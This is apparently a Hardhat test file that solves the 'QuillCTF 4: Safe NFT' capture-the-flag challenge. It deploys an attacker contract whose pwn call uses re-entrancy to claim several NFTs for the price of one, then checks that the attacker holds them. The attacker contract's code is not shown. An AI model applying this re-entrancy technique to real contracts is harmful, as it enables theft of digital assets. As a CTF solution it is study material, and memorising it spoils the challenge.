import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {SafeNFT} from '../../types/typechain';

describe('QuillCTF 4: Safe NFT', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let contract: SafeNFT;

  const price = ethers.utils.parseEther('0.1');
  const count = 3;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('SafeNFT', owner).then(f => f.deploy('Safe NFT', 'SFNFT', price));
    await contract.deployed();
  });

  it('should claim multiple nfts', async () => {
    // deploy the attacker contract
    const attackerContract = await ethers
      .getContractFactory('SafeNFTAttacker', attacker)
      .then(f => f.deploy(count, contract.address));
    await attackerContract.deployed();

    // initiate first claim and consequent re-entries via pwn
    attackerContract.pwn({value: price});
  });

  after(async () => {
    // you should have your requested balance :)
    expect(await contract.balanceOf(attacker.address)).to.eq(count);
  });
});
